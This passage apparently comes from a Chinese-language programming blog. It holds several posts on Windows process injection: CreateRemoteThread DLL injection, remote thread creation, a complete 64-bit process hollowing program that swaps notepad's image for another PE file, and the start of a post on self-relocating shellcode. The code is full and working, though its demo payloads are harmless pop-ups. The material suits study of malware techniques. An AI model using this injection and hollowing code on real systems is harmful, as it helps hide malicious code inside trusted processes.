*dllNamePtr = VirtualAllocEx(hProcess, NULL, 10, MEM_COMMIT, PAGE_READWRITE); if(NULL == dllNamePtr) { printf(&quot;VirtualAllocEx Error: %d\\n&quot;, GetLastError()); return -1; } BOOL result = WriteProcessMemory(hProcess, dllNamePtr, &quot;D:\\\\0.dll&quot;, 9, NULL); if(!result) { printf(&quot;WriteProcessMemory Error: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;\\&quot;D:\\\\0.dll\\&quot; String Address: 0x%p\\n&quot;, dllNamePtr); //找到LoadLibraryA的地址 void *funcAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); printf(&quot;LoadLibraryA Address: 0x%p\\n&quot;, funcAddr); //创建远程线程调用LoadLibraryA(&quot;D:\\0.dll&quot;)，加载0.dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, dllNamePtr, 0, NULL); WaitForSingleObject(hThread, INFINITE); DWORD exitCode; GetExitCodeThread(hThread, &amp;exitCode); //获取LoadLibraryA的返回值 if(!exitCode) { printf(&quot;LoadLibraryA Failed!\\n&quot;); return -1; } printf(&quot;Inject Complete.\\n&quot;); return 0;} 首先，打开记事本，然后在任务管理器的“详细信息”这一栏找到notepad.exe的pid，比如pid为5908。 假设上述代码被编译成了injectdll.exe，接下来，执行injectdll 5908，便能看到记事本的弹窗了：","link":"/2021/01/22/windows-remotethread-dllinject/"},{"title":"在Windows中创建线程和远程线程","text":"本文记录了如何使用CreateThread和CreateRemoteThread创建线程和远程线程。 创建线程CreateThread函数在Windows中创建线程可以使用CreateThread函数，其原型为： 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 最重要的两个参数为lpStartAddress和lpParameter，分别表示线程的起始地址和线程函数的参数。在C语言中，可以用函数名表示函数的起始地址。如果线程创建成功，则会返回新线程的句柄。 参数的详细解释可以参考Microsoft的文档： CreateThread function (processthreadsapi.h) 下面编写一个简单示例来说明CreateThread函数的用法。 线程函数的编写由于线程可以共享进程的全局变量，因此可以编写线程对全局变量进行读写操作。 首先设置一个全局变量i： 1int i; 然后编写两个线程函数。第一个函数会让i不断加上一个数，内容为： 1234567891011121314151617/* thread_func1 * 传入参数： * param[0]: 循环次数 * param[1]: 自增数 * 功能： * 每次循环让全局变量i加上param[1] * 循环param[0]次 */void thread_func1(int *param) { printf(&quot;Thread 1 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { i += param[1]; printf(&quot;%d. &quot;, i); Sleep(100); } printf(&quot;\\nThread 1 End\\n&quot;);} 第二个函数会检查i是否大于某个值，如果是则会将i清零： 12345678910111213141516171819/* thread_func2 * 传入参数： * param[0]: 循环次数 * param[1]: 上限 * 功能： * 每次循环检查全局变量i是否大于param[1] * 如果大于param[1]则将i清零 * 循环param[0]次 */void thread_func2(int *param) { printf(&quot;\\nThread 2 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { if(i &gt; param[1]) { i = 0; } Sleep(100); } printf(&quot;\\nThread 2 End\\n&quot;);} CreateThread中函数的参数只允许传入一个，所以如果需要传入多个参数，可以通过传入数组来实现。 main函数的编写接下来编写main函数。 首先要准备两个函数参数的数组： 12int func1_param[2] = {70, 3};int func2_param[2] = {30, 20}; 第一个函数的两个参数为70和3，说明要循环70次，每次循环i要加上3；第二个函数的两个参数为30和20，说明要循环30次，如果i大于20则将i清零。 然后调用CreateThread先后创建两个线程： 123456789101112131415161718192021222324HANDLE threadHandles[2];//创建第一个线程，执行thread_func1threadHandles[0] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func1, //lpStartAddress func1_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadIdif(NULL == threadHandles[0]) { //检查线程是否创建成功 printf(&quot;Create Thread 1 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1;}//2秒后创建第二个线程，执行thread_func2Sleep(2000);threadHandles[1] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func2, //lpStartAddress func2_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadIdif(NULL == threadHandles[1]) { //检查线程是否创建成功 printf(&quot;Create Thread 2 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1;} 如果要等待两个线程同时结束后再继续接下来的操作，则可以使用WaitForMultipleObjects： 1WaitForMultipleObjects(2, threadHandles, TRUE, 100000); 最后关闭句柄： 123CloseHandle(threadHandles[0]);CloseHandle(threadHandles[1]);return 0; 完整代码及运行结果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;stdio.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;handleapi.h&gt;int i;/* thread_func1 * 传入参数： * param[0]: 循环次数 * param[1]: 自增数 * 功能： * 每次循环让全局变量i加上param[1] * 循环param[0]次 */void thread_func1(int *param) { printf(&quot;Thread 1 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { i += param[1]; printf(&quot;%d. &quot;, i); Sleep(100); } printf(&quot;\\nThread 1 End\\n&quot;);}/* thread_func2 * 传入参数： * param[0]: 循环次数 * param[1]: 上限 * 功能： * 每次循环检查全局变量i是否大于param[1] * 如果大于param[1]则将i清零 * 循环param[0]次 */void thread_func2(int *param) { printf(&quot;\\nThread 2 Start\\n&quot;); for(int j = 0; j &lt; param[0]; j++) { if(i &gt; param[1]) { i = 0; } Sleep(100); } printf(&quot;\\nThread 2 End\\n&quot;);}int main() { int func1_param[2] = {70, 3}; int func2_param[2] = {30, 20}; HANDLE threadHandles[2]; //创建第一个线程，执行thread_func1 threadHandles[0] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func1, //lpStartAddress func1_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadId if(NULL == threadHandles[0]) { //检查线程是否创建成功 printf(&quot;Create Thread 1 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } //2秒后创建第二个线程，执行thread_func2 Sleep(2000); threadHandles[1] = CreateThread(NULL, //lpThreadAttributes 0, //dwStackSize thread_func2, //lpStartAddress func2_param, //lpParameter 0, //dwCreationFlags NULL); //lpThreadId if(NULL == threadHandles[1]) { //检查线程是否创建成功 printf(&quot;Create Thread 2 Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } WaitForMultipleObjects(2, threadHandles, TRUE, 100000); CloseHandle(threadHandles[0]); CloseHandle(threadHandles[1]); return 0;} 12345678&gt; threadtestThread 1 Start3. 6. 9. 12. 15. 18. 21. 24. 27. 30. 33. 36. 39. 42. 45. 48. 51. 54. 57.Thread 2 Start3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6. 9. 12. 15. 18. 21. 3. 6.Thread 2 End9. 12. 15. 18. 21. 24. 27. 30. 33. 36. 39. 42. 45. 48. 51. 54. 57. 60. 63. 66. 69.Thread 1 End 线程1开始后，i会不断增加，然后，当线程2开始后，i超过20便会被清零。线程2结束后，i又会不断增加，而不会被清零。 创建远程线程在Windows中，进程除了可以给自己创建线程，还可以给其他进程创建线程，这就是远程线程。创建远程线程需要用到CreateRemoteThread函数。 CreateRemoteThread函数123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 和CreateThread相比，只多了一个hProcess参数，表示目标进程的句柄。此外，这里的lpStartAddress指的是目标进程中函数的内存地址，所以在正常使用时，远程线程的代码是在目标进程中本来就有的。 参数的详细解释可以查看Microsoft的文档： CreateRemoteThread function (processthreadsapi.h) 接下来，编写一个简单示例来说明这个函数的用法。 编写目标程序目标进程的代码中首先还是设置一个全局变量i，然后是main函数： 12345678int main() { printf(&quot;Process ID: %d\\n&quot;, GetCurrentProcessId()); while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); } return 0;} main函数首先会打印自身的Process ID，然后就会不断地让全局变量i加一，并打印出来。 接下来，再编写一个函数thread_func： 12345678int thread_func() { while(1) { if(i &gt; 20) { i = 0; } Sleep(600); }} 由于main函数中并没有调用这个函数，因此正常运行目标程序，全局变量i并不会清零。 123&gt; programProcess ID: 140320. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 编写程序为目标进程开启远程线程首先通过反汇编工具（如IDA Pro）获取目标程序中thread_func的起始地址。我的机器上thread_func起始地址为0x401550。 然后就可以编写创建远程线程的代码： 1234567891011121314151617181920212223#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) { if(argc &lt; 0) { return -1; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); if(NULL == hProcess) { printf(&quot;Open Process Failed! (%d)\\n&quot;, GetLastError()); return -1; } //program中thread_func起始地址为0x401550 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 0x401550, NULL, 0, NULL); if(NULL == hThread) { printf(&quot;Create Thread Failed! (%d)\\n&quot;, GetLastError()); return -1; } CloseHandle(hProcess); CloseHandle(hThread); return 0;} 首先通过OpenProcess获取目标进程的句柄。然后，再将目标进程句柄、thread_func起始内存地址等参数传入CreateRemoteThread当中。这样就可以在目标进程中开启远程线程执行thread_func中的代码了。 运行结果首先运行目标程序program，得知其进程ID为16500，然后再运行remotethread 16500，remotethread程序就可以根据16500获取目标进程的句柄，进而为目标程序开启远程线程。新的线程就会运行thread_func函数中的代码，从而实现对全局变量i清零的操作。之后，remotethread进程退出了，但由于thread_func线程是属于program进程的，因此仍然会继续运行，i会继续被清零。 12345678&gt; programProcess ID: 165000. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 58. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22.","link":"/2021/01/20/windows-thread-remote-thread/"},{"title":"Process Hollowing在64位进程中的简单实现","text":"首先，创建一个挂起状态的合法进程（比如notepad进程），然后再使用ZwUnmapViewOfSection或NtUnmapViewOfSection将合法的notepad模块占据的内存空间给unmap掉。接下来，向notepad的内存空间中写入恶意的PE文件，并通过修改进程的context，将入口点改为恶意PE文件的入口点。最后，使用ResumeThread使notepad恢复执行，从而达到在notepad进程空间中运行恶意PE文件的效果。这种方法就是Process Hollowing。 本文大量参考Leitch, J. (n.d.). Process Hollowing.这篇文章。 获取一个符合要求的PE文件Process Hollowing需要将一个PE文件手动加载到其他进程的内存空间中。因此，首先要获取一个PE文件。根据Leitch, J. (n.d.). Process Hollowing.这篇文章的说法，PE文件需要满足以下要求： To successfully perform process hollowing the source image must meet a few requirements: To maximize compatibility, the subsystem of the source image should be set to windows. The compiler should use the static version of the run-time library to remove dependence to the Visual C++ runtime DLL. This can be achieved by using the /MT or /MTd compiler options. Either the preferred base address (assuming it has one) of the source image must match that of the destination image, or the source must contain a relocation table and the image needs to be rebased to the address of the destination. For compatibility reasons the rebasing route is preferred. The /DYNAMICBASE or /FIXED:NO linker options can be used to generate a relocation table. 首先，为了增强PE文件的兼容性，subsystem需要设为windows。在实际操作中，我发现如果subsystem设置成了console，则PE文件无法注入Windows窗口程序（如notepad，calc），只能注入控制台程序（如cmd）。 另外，PE文件不应该依赖Visual C++ runtime DLL，这可以通过在编译时使用/MT或/MTd选项解决。 最后，如果PE文件无法加载到预定的基地址，还需进行重定位操作。不过本文只考虑PE文件可以加载到预定基地址的情况，因此不会进行重定位的操作。 根据上述三个要求，编写如下代码： 123456789101112131415161718#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;#pragma comment(lib, &quot;user32.lib&quot;)int WinMain() { srand(time(NULL)); char str1[20]; sprintf(str1, &quot;Current pid: %d&quot;, GetCurrentProcessId()); char str2[20]; int i; while(i = rand() % 100) { sprintf(str2, &quot;%d &gt; 0&quot;, i); MessageBoxA(NULL, str1, str2, MB_ICONERROR | MB_OK); } return 0;} 然后使用Visual Studio的命令行工具编译： 123456789101112131415161718&gt; vsdevcmd -arch=amd64************************************************************************ Visual Studio 2019 Developer Command Prompt v16.8.4** Copyright (c) 2020 Microsoft Corporation**********************************************************************&gt; cl /MT source.c /link /subsystem:windows用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版版权所有(C) Microsoft Corporation。保留所有权利。source.csource.c(7): warning C4026: 使用形参表声明的函数Microsoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:source.exe/subsystem:windowssource.obj 根据PE文件内容将其加载到内存假设已经将PE文件全部读入内存，并且保存到了一个buf数组当中，现在要获取其装入内存后的情况，并且保存在另一个数组mem中。 首先，找到e_lfanew，并据此定位到其NT映像头： 1234//读取DOS文件头，获取e_lfanewPIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0];//获取映像头PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; NT映像头中包含一些信息，比如可执行文件默认装入的地址ImageBase，装入内存后映像的总尺寸SizeOfImage，程序入口点AddressOfEntryPoint等。根据SizeOfImage就可以知道需要多大的内存来保存PE文件装入内存的状态，而ImageBase和AddressOfEntryPoint则在后面的操作需要用到： 12345//根据可选头的SizeOfImage分配内存unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1);(*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase;(*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint;(*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; NT映像头中还包含一个SizeOfHeaders，根据这一数据将PE文件的头部复制到内存中： 12//将文件头复制到内存中memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); 最后，根据节表包含的信息将每一节依次装载到内存中的特定位置： 12345678910//获取节表起始位置PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader];//将每一节的内容依次复制到内存中for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData);} 将上述过程写成load_pe64函数，其完整内容如下： 1234567891011121314151617181920212223unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) { //读取DOS文件头，获取e_lfanew PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0]; //获取映像头 PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; //根据可选头的SizeOfImage分配内存 unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1); (*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase; (*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint; (*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; //获取节表起始位置 PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader]; //将文件头复制到内存中 memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); //将每一节的内容依次复制到内存中 for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData); } return mem;} 编写程序实现Process Hollowing创建挂起的notepad进程创建挂起状态的子进程只需要在CreateProcessA的时候加一句CREATE_SUSPENDED就行了。 12345678910111213141516171819//创建挂起的notepad进程STARTUPINFO si = {0};PROCESS_INFORMATION pi = {0};si.cb = sizeof(si);BOOL result = CreateProcessA( NULL, //lpApplicationName &quot;notepad&quot;, //lpCommandLine NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformationif(!result) { printf(&quot;CreateProcess Failed: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;Create Suspended notepad, pid: %d\\n&quot;, pi.dwProcessId); 获取notepad加载的基地址进程真实加载的地址需要从PEB中找到，所以先要找到PEB的基地址。一种方法是通过NtQueryInformationProcess找到PEB基地址。 1234//获取notepad进程的PEB地址PROCESS_BASIC_INFORMATION processInfo;NtQueryInformationProcess(pi.hProcess, 0, &amp;processInfo, sizeof(processInfo), NULL);printf(&quot;PebBaseAddress: %p\\n&quot;, processInfo.PebBaseAddress); 如果查看微软关于PEB的官方文档，会发现PEB中很多项都是Reserved。要想知道PEB中每一项真实的含义是什么，可以在别的网站上看： PEB (Process Enviroment Block) 然后就可以发现，官方文档中的Reserved3[1]这一项实际上就是ImageBaseAddress，据此就可以找到notepad模块的基地址： 123456//PEB的Reserved3[1]就是notepad进程加载的基地址PEB processPeb;result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL);void *originImageBase = processPeb.Reserved3[1];printf(&quot;ImageBaseAddress: %p\\n&quot;, originImageBase);system(&quot;pause&quot;); 知道了notepad的基地址后，就可以通过NtUnmapViewOfSection将notepad占据的内存给unmap掉了： 123456//unmap合法内存的代码DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase);if(dwResult) { printf(&quot;NtUnmapViewOfSection Failed: %d\\n&quot;, dwResult); return -1;} 将PE文件加载到notepad内存空间中将想要加载的PE文件读入内存： 12345678910111213141516//读取source.exe文件，将PE文件内容全部放入内存FILE *fptr = fopen(&quot;source.exe&quot;, &quot;rb&quot;);if(NULL == fptr) { printf(&quot;Open source.exe Failed!\\n&quot;); return -1;}fseek(fptr, 0L, SEEK_END);long fileSize = ftell(fptr);rewind(fptr);BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000);if(NULL == fileBuf) { printf(&quot;Malloc Failed!\\n&quot;); return -1;}fread(fileBuf, 1, fileSize, fptr);fclose(fptr); 然后，调用之前写的load_pe64函数，将PE文件按照文件结构载入内存中： 1234567//根据PE文件内容生成PE文件载入内存的状态int ImageSize;ULONGLONG newImageBase;DWORD entryPoint;unsigned char *peMem = load_pe64(fileBuf, &amp;ImageSize, &amp;newImageBase, &amp;entryPoint);printf(&quot;SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\\n&quot;, ImageSize, newImageBase, entryPoint); 最后，使用WriteProcessMemory，将这块内存写到notepad的内存空间中： 1234567891011121314151617//VirtualAllocEx申请一块内存加载source.exevoid *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if(mem != (void *)newImageBase) { printf(&quot;VirtualAllocEx Failed, mem: %p&quot;, mem); free(peMem); free(fileBuf); return -1;}//将source.exe写入notepad进程空间中result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL);free(peMem);free(fileBuf);if(!result) { printf(&quot;Load PE Failed: %d\\n&quot;, GetLastError()); return -1;} 由于没有进行重定位操作，这里申请的内存起始地址必须为可执行文件默认装入的内存地址，即PE文件中的ImageBase。 PEB中的ImageBaseAddress这一项也得进行相应的修改： 1234567//修改PEB中的ImageBaseprocessPeb.Reserved3[1] = (PVOID)newImageBase;result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL);if(!result) { printf(&quot;Modify PEB Failed: %d\\n&quot;, GetLastError()); return -1;} 修改进程的contextCONTEXT结构体中存储了一些寄存器的值，可以通过设置notepad进程的context设置它的寄存器的值。 当进程以挂起状态被创建时，它的入口点被存储在了寄存器当中。在32位进程中，存储入口点的寄存器为EAX，所以Leitch, J. (n.d.). Process Hollowing.这篇文章会设置CONTEXT结构体中的Eax这一项。 在64位进程中，存储入口点的寄存器变成了RCX。可以在创建了挂起的notepad进程后，使用x64dbg附加到这个进程上，看一下各个寄存器的值： 其中RCX的值就是&lt;notepad.EntryPoint&gt;。 由于PE文件已经加载到了notepad内存空间中，EntryPoint也发生了相应的变化，故需要对RCX寄存器的值进行修改： 1234567891011121314//修改notepad进程的context，将入口点(rcx寄存器)设置为source.exe的入口点CONTEXT targetContext;targetContext.ContextFlags = CONTEXT_FULL;result = GetThreadContext(pi.hThread, &amp;targetContext);if(!result) { printf(&quot;GetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1;}targetContext.Rcx = newImageBase + entryPoint;result = SetThreadContext(pi.hThread, &amp;targetContext);if(!result) { printf(&quot;SetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1;} 让挂起的notepad恢复运行最后，使用ResumeThread恢复notepad的运行： 1234ResumeThread(pi.hThread);printf(&quot;Injected!\\n&quot;);WaitForSingleObject(pi.hThread, INFINITE);printf(&quot;Wait Complete!\\n&quot;); 然后就能发现，运行的并不是notepad程序，而是一个弹窗程序，这就说明成功进行了进程的替换。 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)unsigned char *load_pe64(unsigned char *buf, int *pSizeOfImage, ULONGLONG *pImageBase, DWORD *pEntryPoint) { //读取DOS文件头，获取e_lfanew PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)&amp;buf[0]; //获取映像头 PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)&amp;buf[dosHeader-&gt;e_lfanew]; //根据可选头的SizeOfImage分配内存 unsigned char *mem = calloc(ntHeader-&gt;OptionalHeader.SizeOfImage, 1); (*pImageBase) = ntHeader-&gt;OptionalHeader.ImageBase; (*pEntryPoint) = ntHeader-&gt;OptionalHeader.AddressOfEntryPoint; (*pSizeOfImage) = ntHeader-&gt;OptionalHeader.SizeOfImage; //获取节表起始位置 PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)&amp;buf[dosHeader-&gt;e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader-&gt;FileHeader.SizeOfOptionalHeader]; //将文件头复制到内存中 memcpy(mem, buf, ntHeader-&gt;OptionalHeader.SizeOfHeaders); //将每一节的内容依次复制到内存中 for(int i = 0; i &lt; ntHeader-&gt;FileHeader.NumberOfSections; i++) { DWORD rva = sectionHeader[i].VirtualAddress; DWORD fptr = sectionHeader[i].PointerToRawData; memcpy(&amp;mem[rva], &amp;buf[fptr], sectionHeader[i].SizeOfRawData); } return mem;}int main() { //创建挂起的notepad进程 STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( NULL, //lpApplicationName &quot;notepad&quot;, //lpCommandLine NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;CreateProcess Failed: %d\\n&quot;, GetLastError()); return -1; } printf(&quot;Create Suspended notepad, pid: %d\\n&quot;, pi.dwProcessId); //获取notepad进程的PEB地址 PROCESS_BASIC_INFORMATION processInfo; NtQueryInformationProcess(pi.hProcess, 0, &amp;processInfo, sizeof(processInfo), NULL); printf(&quot;PebBaseAddress: %p\\n&quot;, processInfo.PebBaseAddress); //PEB的Reserved3[1]就是notepad进程加载的基地址 PEB processPeb; result = ReadProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL); void *originImageBase = processPeb.Reserved3[1]; printf(&quot;ImageBaseAddress: %p\\n&quot;, originImageBase); system(&quot;pause&quot;); //unmap合法内存的代码 DWORD dwResult = NtUnmapViewOfSection(pi.hProcess, originImageBase); if(dwResult) { printf(&quot;NtUnmapViewOfSection Failed: %d\\n&quot;, dwResult); return -1; } //读取source.exe文件，将PE文件内容全部放入内存 FILE *fptr = fopen(&quot;source.exe&quot;, &quot;rb&quot;); if(NULL == fptr) { printf(&quot;Open source.exe Failed!\\n&quot;); return -1; } fseek(fptr, 0L, SEEK_END); long fileSize = ftell(fptr); rewind(fptr); BYTE *fileBuf = (BYTE *)malloc(fileSize + 0x10000); if(NULL == fileBuf) { printf(&quot;Malloc Failed!\\n&quot;); return -1; } fread(fileBuf, 1, fileSize, fptr); fclose(fptr); //根据PE文件内容生成PE文件载入内存的状态 int ImageSize; ULONGLONG newImageBase; DWORD entryPoint; unsigned char *peMem = load_pe64(fileBuf, &amp;ImageSize, &amp;newImageBase, &amp;entryPoint); printf(&quot;SizeOfImage: 0x%x, ImageBase: 0x%llx, AddressOfEntryPoint: 0x%x\\n&quot;, ImageSize, newImageBase, entryPoint); //VirtualAllocEx申请一块内存加载source.exe void *mem = VirtualAllocEx(pi.hProcess, (void *)newImageBase, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if(mem != (void *)newImageBase) { printf(&quot;VirtualAllocEx Failed, mem: %p&quot;, mem); free(peMem); free(fileBuf); return -1; } //将source.exe写入notepad进程空间中 result = WriteProcessMemory(pi.hProcess, mem, peMem, ImageSize, NULL); free(peMem); free(fileBuf); if(!result) { printf(&quot;Load PE Failed: %d\\n&quot;, GetLastError()); return -1; } //修改PEB中的ImageBase processPeb.Reserved3[1] = (PVOID)newImageBase; result = WriteProcessMemory(pi.hProcess, processInfo.PebBaseAddress, &amp;processPeb, sizeof(processPeb), NULL); if(!result) { printf(&quot;Modify PEB Failed: %d\\n&quot;, GetLastError()); return -1; } //修改notepad进程的context，将入口点(rcx寄存器)设置为source.exe的入口点 CONTEXT targetContext; targetContext.ContextFlags = CONTEXT_FULL; result = GetThreadContext(pi.hThread, &amp;targetContext); if(!result) { printf(&quot;GetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1; } targetContext.Rcx = newImageBase + entryPoint; result = SetThreadContext(pi.hThread, &amp;targetContext); if(!result) { printf(&quot;SetThreadContext Failed: %d\\n&quot;, GetLastError()); return -1; } system(&quot;pause&quot;); ResumeThread(pi.hThread); printf(&quot;Injected!\\n&quot;); WaitForSingleObject(pi.hThread, INFINITE); printf(&quot;Wait Complete!\\n&quot;); return 0;} 编译运行： 12345678910111213141516171819202122&gt; cl hollow.c用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.28.29336 版版权所有(C) Microsoft Corporation。保留所有权利。hollow.chollow.c(1): warning C4819: 该文件包含不能在当前代码页(936)中表示的字符。请将该文件保存为 Unicode 格式以防止数据丢失Microsoft (R) Incremental Linker Version 14.28.29336.0Copyright (C) Microsoft Corporation. All rights reserved./out:hollow.exehollow.obj&gt; hollowCreate Suspended notepad, pid: 10776PebBaseAddress: 000000FD3FB49000ImageBaseAddress: 00007FF6CA930000Press any key to continue . . .SizeOfImage: 0x20000, ImageBase: 0x140000000, AddressOfEntryPoint: 0x14fcPress any key to continue . . .Injected!Wait Complete!","link":"/2021/01/28/windows-process-hollowing/"},{"title":"编写具有自我重定位功能的64位代码并注入其他进程","text":"进程注入的一种实现方法是将恶意代码直接复制到目标进程的内存空间，并通过CreateRemoteThread在目标进程中执行这段恶意代码。这个方法的一个难点在于，恶意代码复制到目标进程的内存空间后，它的基地址可能会发生变化。假如说恶意代码需要对自身某个特定地址的数据进行访问，就会访问不到这个数据，因为数据的地址已经改变了。为了解决这一问题，需要进行重定位的操作。 一种重定位的方法是：在注入恶意代码之前，对代码内容进行预处理，根据实际申请到的目标进程内存首地址，修正恶意代码中实际地址与预期地址的差异。这一过程可以借助重定位表来完成，重定位表中包含一个数组，记录了代码中需要重定位的数据的相对虚拟地址RVA。 另一种方式就是恶意代码自身进行重定位，比如下面这段代码： 12345 call relocreloc: pop rbx mov rax, offset reloc sub rbx, rax 这段代码执行完毕后，rbx寄存器中就保存了真实地址和预期地址的差值。接下来，假设想要获得变量Variable的真实地址，则可以执行这段代码： 12mov rax, offset Variableadd rbx, rax 